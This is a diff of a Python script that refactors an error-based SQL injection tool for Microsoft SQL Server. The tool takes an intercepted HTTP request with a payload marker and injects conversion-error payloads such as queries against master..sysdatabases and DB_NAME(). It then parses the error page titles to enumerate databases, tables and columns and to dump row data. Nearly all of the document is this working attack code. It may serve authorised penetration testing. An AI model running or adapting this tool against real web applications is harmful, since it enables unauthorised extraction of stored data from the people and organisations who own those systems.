@@ -1,123 +1,58 @@
 #!/usr/bin/env python3
 
-from urllib.parse import unquote_plus as urldec
 from urllib.parse import quote_plus as urlenc
 from bs4 import BeautifulSoup as bs
 from time import sleep
-import argparse
 import sys
-import re
 
-verbose = False
-wait_sec = 0.0
-
-
-class RequestSender:
-    import requests
-    s = requests.Session()
-    timeout = 12.0
-    retry = 3
-    err_wait = 1
-    url = ''
-    method = ''
-    header = ''
-    init_payload = ''
-
-    @staticmethod
-    def return_contents(r):
-        # config here
-        contents = bs(r.text, 'html.parser')
-        return contents.title.string.split("'")[1]
-
-    @staticmethod
-    def gen_header(source):
-        lines = source.split('\n')
-
-        method, path, _ = lines[0].split(' ')
-        host, *port = lines[1].split(' ', 1)[1].split(':')
-        port = port or [80]
-        url = f"http://{host}:{port[0]}{path}"
-
-        header = {}
-        for line in lines[2:]:
-            splitted = line.split(':', 1)
-            splitted[1] = splitted[1].split(' ', 1)[1]
-            if splitted[0] != 'Connection':
-                header[splitted[0]] = splitted[1]
-
-        return url, method, header
-
-    @staticmethod
-    def gen_payload(source):
-        result = source.split(r'%5EPAYLOAD%5E')
-        result[0] += left
-        result[1] = right + result[1]
-
-        return result
-
-    def send_request(self, payload):
-        from requests import Request
-        req = Request()
-        if self.method == 'POST':
-            pl = self.init_payload[0] + payload + self.init_payload[1]
-            req = Request(self.method, self.url, headers=self.header, data=pl)
-        # if self.method == 'GET':
-        #     req = Request(self.method, self.url, timeout=self.timeout,
-        #                   headers=self.header, params=payload)
-        else:
-            print("error: now only support POST", file=sys.stderr)
-            exit(1)
-
-        prep = self.s.prepare_request(req)
-
-        for _ in range(self.retry):
-            try:
-                r = self.s.send(prep, timeout=self.timeout)
-                return self.return_contents(r)
-            except:
-                sleep(self.err_wait)
-        else:
-            raise Exception
-
-    def __init__(self, args):
-        input = open(args.request, mode='r').read().strip()
-        raw_header, raw_payload = input.split('\n\n', 1)
-
-        self.url, self.method, self.header = self.gen_header(raw_header)
-        self.init_payload = self.gen_payload(raw_payload)
-
-        if args.proxy:
-            proxy = retr_proxy(args.proxy)
-            self.s.proxies.update(proxy)
-            if verbose:
-                print(f"debug: proxy set: {args.proxy}", file=sys.stderr)
-
-    def __del__(self):
-        self.s.close()
+from pysqllib.sender import RequestSender
+from pysqllib.arguments import Arguments
+from pysqllib.commonfunc import *
 
 
-def print_verbose(payload):
-    print(f"debug: {urldec(left + payload + right)}", file=sys.stderr)
+def return_contents(r):
+    # config here
+    contents = bs(r.text, 'html.parser')
+    return contents.title.string.split("'")[1]
 
 
 def retr_loop(sender, payload1, payload2):
     result = []
     i = 0
+    retry = 0
     while True:
         not_in = ','.join([f"'{elem}'" for elem in result]) or "''"
         payload = payload1 + urlenc(not_in) + payload2
-        if verbose:
+        if args.p.verbose:
             print_verbose(payload)
 
+        for _ in range(sender.retry):
+            try:
+                r = sender.send_request(payload)
+                break
+            except KeyboardInterrupt:
+                exit(1)
+            except:
+                sleep(args.wait_sec)
+        else:
+            raise Exception('request error')
+
         try:
-            content = sender.send_request(payload)
+            content = return_contents(r)
+        except KeyboardInterrupt:
+            exit(1)
         except:
-            break
+            retry += 1
+            if retry == sender.retry:
+                break
+            sleep(args.wait_sec)
+            continue
 
         result.append(content)
         print(f"{i}: {content}")
-        sleep(wait_sec)
+        sleep(args.wait_sec)
         i += 1
+        retry = 0
 
     return result
 
@@ -127,9 +62,10 @@ def retr_database(sender):
         "convert(int, (SELECT TOP 1 name FROM master..sysdatabases WHERE name not in (", ")))"]
     print('databases:')
     payload3 = urlenc("convert(int, DB_NAME())")
-    if verbose:
+    if args.p.verbose:
         print_verbose(payload3)
-    content = sender.send_request(payload3)
+    r = sender.send_request(payload3)
+    content = return_contents(r)
     print(f"current: {content}")
 
     payload1 = urlenc(base[0])
@@ -206,174 +142,24 @@ def retr_data(sender, databases, tables, columns):
 
                 data[db][tb][cl] = retr_loop(sender, payload1, payload2)
 
-    for db in databases:
-        for tb in tables[db]:
-            print()
-            print(f"SELECT * FROM {db}..{tb};")
-            print('\t'.join(columns[db][tb]))
-            leng = max([len(data[db][tb][cl]) for cl in columns[db][tb]])
-
-            for i in range(leng):
-                result = []
-                for cl in columns[db][tb]:
-                    try:
-                        result.append(data[db][tb][cl][i])
-                    except:
-                        result.append('')
-
-                print('\t'.join(result))
-
-    print()
-
-
-def retr_args(raw_args):
-    result = []
-    for arg in raw_args.split(','):
-        elem, *num = arg.split('/')
-        num = num or [1]
-        result += [elem] * int(num[0])
-
-    return result
-
-
-def retr_database_list(raw_databases):
-    result = []
-    for db in raw_databases:
-        if db not in result:
-            result.append(db)
-
-    return result
-
-
-def retr_table_dic(raw_databases, raw_tables):
-    result = {}
-    for db, tb in zip(raw_databases, raw_tables):
-        if db not in result:
-            result[db] = []
-        if tb not in result[db]:
-            result[db].append(tb)
-
-    return result
-
-
-def retr_column_dic(raw_databases, raw_tables, raw_columns):
-    result = {}
-    for db, tb, cl in zip(raw_databases, raw_tables, raw_columns):
-        if db not in result:
-            result[db] = {}
-        if tb not in result[db]:
-            result[db][tb] = []
-        if cl not in result[db][tb]:
-            result[db][tb].append(cl)
-
-    return result
-
-
-def retr_proxy(raw_proxy):
-    proto = args.proxy.split(':')[0]
-    if not re.match(r'^socks5h?$|^https?$', proto):
-        print(f"error: invalid proxy: {args.proxy}", file=sys.stderr)
-        exit(1)
-    return {'http': args.proxy, 'https': args.proxy}
+    print_data(databases, tables, columns, data)
 
 
 def main():
     sender = RequestSender(args)
 
-    verbose = args.verbose
-
-    if args.wait:
-        try:
-            global wait_sec
-            wait_sec = float(args.wait)
-            if verbose:
-                print(
-                    f"debug: wait sec set: {wait_sec}", file=sys.stderr)
-        except:
-            print(
-                f"error: cannot convert wait to float: -w {args.wait}", file=sys.stderr)
-            exit(1)
-
-    if args.database is None and args.table is None and args.column is None:
+    if args.command == 'database':
         retr_database(sender)
-
-    elif args.database and args.table is None and args.column is None:
-        raw_databases = retr_args(args.database)
-        databases = retr_database_list(raw_databases)
-        retr_tables(sender, databases)
-
-    elif args.database and args.table and args.column is None:
-        raw_databases = retr_args(args.database)
-        raw_tables = retr_args(args.table)
-        if len(raw_databases) != len(raw_tables):
-            if len(raw_databases) == 1:
-                raw_databases = [raw_databases[0]] * len(raw_tables)
-
-            elif len(raw_tables) == 1:
-                raw_tables = [raw_tables[0]] * len(raw_databases)
-
-            else:
-                print('error: argument length is different', file=sys.stderr)
-                exit(1)
-
-        tables = retr_table_dic(raw_databases, raw_tables)
-        databases = retr_database_list(raw_databases)
-        retr_columns(sender, databases, tables)
-
-    elif args.database and args.table and args.column:
-        raw_databases = retr_args(args.database)
-        raw_tables = retr_args(args.table)
-        raw_columns = retr_args(args.column)
-        if len(raw_databases) != len(raw_tables) or len(raw_databases) != len(raw_columns):
-            if len(raw_databases) == 1:
-                raw_databases = [raw_databases[0]] * \
-                    max(len(raw_tables), len(raw_columns))
-
-            if len(raw_tables) == 1:
-                raw_tables = [raw_tables[0]] * \
-                    max(len(raw_databases), len(raw_columns))
-
-            if len(raw_columns) == 1:
-                raw_columns = [raw_columns[0]] * \
-                    max(len(raw_databases), len(raw_tables))
-
-            if len(raw_databases) != len(raw_tables) or len(raw_databases) != len(raw_columns):
-                print('error: argument length is different', file=sys.stderr)
-                exit(1)
-
-        columns = retr_column_dic(
-            raw_databases, raw_tables, raw_columns)
-        tables = retr_table_dic(raw_databases, raw_tables)
-        databases = retr_database_list(raw_databases)
-        retr_data(sender, databases, tables, columns)
+    elif args.command == 'table':
+        retr_tables(sender, args.databases)
+    elif args.command == 'column':
+        retr_columns(sender, args.databases, args.tables)
+    elif args.command == 'data':
+        retr_data(sender, args.databases, args.tables, args.columns)
     else:
-        print('error: invalid arguments', file=sys.stderr)
-        exit(1)
+        print('error: unreachable', file=sys.stderr)
 
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser()
-
-    parser.add_argument(
-        'request', help='http request file (e.g. intersepted request by burp) payload place should be holded by %%5EPAYLOAD%%5E (html encoded ^PAYLOAD^)')
-    parser.add_argument(
-        '-p', '--proxy', help='http or socks5 proxy')
-    parser.add_argument(
-        '-w', '--wait', help='interval between request (default: 0)')
-    parser.add_argument(
-        '-d', '--database', help='database from which you want to dump tables (comma separate (arg[/num][,arg[/num][, ...]]))')
-    parser.add_argument(
-        '-t', '--table', help='table from which you want to dump columns (comma separate (arg[/num][,arg[/num][, ...]]))')
-    parser.add_argument(
-        '-c', '--column', help='column from which you want to dump data (comma separate (arg[/num][,arg[/num][, ...]]))')
-    parser.add_argument(
-        '-v', '--verbose', help='verbose mode', action='store_true')
-    parser.add_argument(
-        '-l', '--left', help='padding string for left', required=True)
-    parser.add_argument(
-        '-r', '--right', help='padding string for right', required=True)
-
-    args = parser.parse_args()
-    left = urlenc(args.left)
-    right = urlenc(args.right)
+    args = Arguments()
     main()
